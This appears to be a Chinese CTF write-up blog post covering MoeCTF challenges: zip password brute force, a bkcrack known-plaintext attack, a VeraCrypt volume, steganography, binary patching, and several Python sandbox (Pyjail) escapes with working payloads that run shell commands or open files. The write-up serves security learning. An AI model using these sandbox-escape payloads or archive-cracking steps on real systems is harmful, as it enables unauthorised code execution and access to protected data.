递归解压脚本，并把所有密码写入txt（最后手动处理一下多余的提示）。 import zipfile import tempfile import os def extract_zips(zip_path, output_file): with tempfile.TemporaryDirectory() as temp_dir: with zipfile.ZipFile(zip_path, 'r') as zip_ref: zip_ref.extractall(temp_dir) for item in os.listdir(temp_dir): item_path = os.path.join(temp_dir, item) if item.endswith('.txt'): with open(item_path, 'r', encoding='utf-8', errors='ignore') as f: content = f.read().strip() with open(output_file, 'a', encoding='utf-8') as out_f: out_f.write(content + '\\n') elif item.endswith('.zip'): extract_zips(item_path, output_file) def main(): zip_path = \"password.zip\" output_file = \"dic.txt\" extract_zips(zip_path, output_file) if __name__ == \"__main__\": main() 然后用ARCHPR字典爆破，成功解压。 a296a5ec1385f394e8cb 发现明文.exe和flag.txt，联想到bkcrack明文攻击（Bugku CTF：请攻击这个压缩包[WriteUP]-CSDN博客） echo \"4d5a90000300000004000000ffff\" | xxd -r -p > plain.bin bkcrack -C flag.zip -c \"明文.exe\" -p plain.bin # 得到key1 key2 key3 bkcrack -C flag.zip -k eec878a3 6808e48f 3aa41bd8 -U new_flag.zip 123456 # 用新密码解密 moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125; Encrypted_Volume 找到钥匙，解开加密卷！ 用01editor打开，在最后一个文件块中找到了PNG，保留这一部分发现二维码，扫描找到密钥。 :@(s&lt;&quot;A3F:89x541Ux[&lt; 用veracrypt挂载Volume文件，得到了brainfuck加密文件，解密一下即可。 moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125; 哈基米难没露躲 出题人哈基米音乐听多了(bushi 看了半天，符号和词都有规律，100pts不至于自己解吧？我去网上搜了搜哈基米加密，还真有。 简直就是世界上最优美的加密啊。 https://lhlnb.top/hajimi/base64 提示隐写，发现有零宽字符，需要再解密。https://330k.github.io/misc_tools/unicode_steganography.html moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125; 2048_master 大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^ _ ^ 游戏玩了下玩不出来，所以我选择reverse。 思路：找到比较 &gt; 13 的指令并修改成&gt; 1。 cmp eax, 0Dh # 改成01h IDA中的操作是：1.修改：Edit → Patch program → Assemble，2.保存：Edit → Patch program → Apply patches to input file。运行修改后的.exe后就得到了flag。 moectf&#123;Y0u_4re_a_2048_m4st3r!!!!r0erowhu&#125; Pyjail 0 A simple reader (所以严格来说这题不算 Pyjail) 关于验证码，示例：Please enter the reverse of ‘GZUUAOIS’ to continue: SIOAUUZG 至于 flag 的位置？你可以参考 Web 第十二章（ Pyjail沙箱逃逸笔记：https://xz.aliyun.com/news/12093 想起了那个把我恶心坏的web第十二章了，在虚拟环境里。 文件路径：/proc/self/environ。 接下来我都在windows上用netcat连接，格式为netcat localhost &lt;port&gt;。 此题输入反转字符串和文件地址即得到： moectf&#123;07a71386-d189-c798-f194-04229b0b07e7&#125; Pyjail 1 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") # 过滤关键字 forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file'] for keyword in forbidden_keywords: if keyword in user_input: print(f\"Forbidden keyword detected: &#123;keyword&#125;\") return result = eval(user_input) 我们可以用字节数组或字符编码来构造字符串，避免直接写import，想要执行如下代码我们可以改写： getattr(globals()['__builtins__'], '__import__')('os').system('cat /tmp/flag.txt') getattr(globals()['__builtins__'], bytes([95, 95, 105, 109, 112, 111, 114, 116, 95, 95]).decode())('os').system('cat /tmp/flag.txt') moectf&#123;77553abb-2b7a-2c71-1870-4c41d9778a64&#125; Pyjail 2 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") # 过滤关键字 forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file'] for keyword in forbidden_keywords: if keyword in user_input: print(f\"Forbidden keyword detected: &#123;keyword&#125;\") return # 过滤特殊字符 forbidden_chars = ['.', '_', '[', ']', \"'\", '\"'] for char in forbidden_chars: if char in user_input: print(f\"Forbidden character detected: &#123;char&#125;\") return result = eval(user_input) 1. 使用chr()编码绕过字符过滤 所有被禁止的字符（如_）和关键字都用chr(ASCII码)表示。 2. 使用getattr()进行属性访问 由于.被禁止，使用getattr(object, attribute)来访问属性。 3. 使用globals()和__getitem__()访问字典 由于[]被禁止，使用：dict[key] → dict.__getitem__(key) → getattr(dict, '__getitem__')(key)。 __import__(&#39;os&#39;).system(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;) getattr( getattr( getattr( getattr( globals(), &#39;__getitem__&#39; )(&#39;__builtins__&#39;), &#39;__dict__&#39;, getattr( globals(), &#39;__getitem__&#39; )(&#39;__builtins__&#39;) ), &#39;__getitem__&#39; )(&#39;__import__&#39;)(&#39;os&#39;), &#39;system&#39; )(&#39;cat &#x2F;tmp&#x2F;flag.txt&#39;) getattr(getattr(getattr(getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)), chr(95)+chr(95)+chr(100)+chr(105)+chr(99)+chr(116)+chr(95)+chr(95), getattr(globals(), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95))), chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)) moectf&#123;59042fef-1e84-9185-fcbc-50168d5e02ba&#125; Pyjail 3 flag 位置在 /tmp 下 def chall(): user_input = input(\"Give me your code: \") try: result = eval(user_input, &#123;\"__builtins__\": None&#125;, &#123;&#125;) # Hint: When __builtins__ is None, you need to be more creative... print(\"Code executed successfully!\") if result is not None: print(f\"Return value: &#123;result&#125;\") except Exception as e: print(f\"Execution error: &#123;type(e).__name__&#125;: &#123;e&#125;\") 即使 __builtins__ 被禁用，仍然可以通过对象继承链或现有类的属性来重新获取内置函数。例如： 通过元类（如 ().__class__.__mro__）找到基类（如 object）。 遍历子类（如 __subclasses__()）来寻找可用的类（如 os._wrap_close、ModuleSpec 等）。 通过这些类的 __init__.__globals__ 或 __builtins__ 属性重新获取内置函数。 ([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__&#x3D;&#x3D;&#39;ModuleSpec&#39;][0].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;tmp&#x2F;flag.txt&#39;).read()) moectf&#123;6486e9b8-47b8-0b5e-dead-8e554dd2a1b6&#125; Pyjail4 flag 位置在 /tmp 下 import ast import base64 # 自定义 AST 节点访问器来限制可用的语法结构 class RestrictedNodeVisitor(ast.NodeVisitor): forbidden_attrs = &#123; \"__class__\", \"__dict__\", \"__bases__\", \"__mro__\", \"__subclasses__\", \"__globals__\", \"__code__\", \"__closure__\", \"__func__\", \"__self__\", \"__module__\", \"__import__\", \"__builtins__\", \"__base__\", \"__init__\", \"__getattribute__\" &#125; def visit_Attribute(self, node): # 禁止危险属性访问 if isinstance(node.attr, str) and node.attr in self.forbidden_attrs: raise RuntimeError(f\"Access to attribute '&#123;node.attr&#125;' is forbidden!\") self.generic_visit(node) def chall(): user_input = input(\"Give me your code after base64 encoding it: \") code = base64.b64decode(user_input).decode('utf-8') if not user_input: print(\"Empty input!\") return try: # 使用 AST 解析和验证代码 tree = ast.parse(code) visitor = RestrictedNodeVisitor() visitor.visit(tree) # 创建受限的执行环境 safe_builtins = &#123; \"print\": print, \"filter\": filter, \"list\": list, \"len\": len, \"Exception\": Exception &#125; safe_globals = &#123;\"__builtins__\": safe_builtins&#125; # 执行用户代码 exec(code, safe_globals, &#123;&#125;) print(\"Code executed successfully!\") except SyntaxError as e: print(f\"Syntax Error: &#123;e&#125;\") except RuntimeError as e: print(f\"Runtime Error: &#123;e&#125;\") except Exception as e: print(f\"Execution Error: &#123;type(e).__name__&#125;: &#123;e&#125;\") 在Python中，栈帧（Stack Frame）是解释器用于管理函数调用的一种内部数据结构。每当一个函数被调用时，Python就会创建一个栈帧对象，其中包含了该函数执行所需的“上下文”，例如局部变量、传入的参数以及当前指令的位置（返回地址）。 import base64 code = \"\"\" try: raise Exception() except Exception as e: frame = e.__traceback__.tb_frame.f_back builtins = frame.f_globals['__builtins__'] print(builtins.open('/tmp/flag.txt').read()) \"\"\" encoded = base64.b64encode(code.encode('utf-8')).decode('utf-8') print(encoded) dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgZnJhbWUgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrCiAgICBidWlsdGlucyA9IGZyYW1lLmZfZ2xvYmFsc1snX19idWlsdGluc19fJ10KICAgIHByaW50KGJ1aWx0aW5zLm9wZW4oJy90bXAvZmxhZy50eHQnKS5yZWFkKCkp moectf&#123;8e6909e8-7b9b-1c08-3131-46859e6830d9&#125; MoeCTF指导版 最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手…它可能有点…（？ 耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈 （这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验） （游戏加载需要一定时间） 查看源代码有助于做题。 第一关：精准投喂25个小鱼干，不然会触发114514 第二关：找信息即可241410173和241410156 第三关：文字游戏，密码分别是password 和incorrect! 第四关：复制发现隐藏的密钥xbhiuebkjvs 第五关：翻转后点击flag按钮凸了 moectf&#123;11738832-155d-3f7a-cc6b-95da7459659d&#125;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://saintcen.github.io/tags/CTF/"}]}],"categories":[{"name":"笔记","slug":"笔记","permalink":"https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"},{"name":"教程","slug":"教程","permalink":"https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"CS基础","slug":"CS基础","permalink":"https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"},{"name":"开发","slug":"开发","permalink":"https://saintcen.github.io/tags/%E5%BC%80%E5%8F%91/"},{"name":"CTF","slug":"CTF","permalink":"https://saintcen.github.io/tags/CTF/"}]}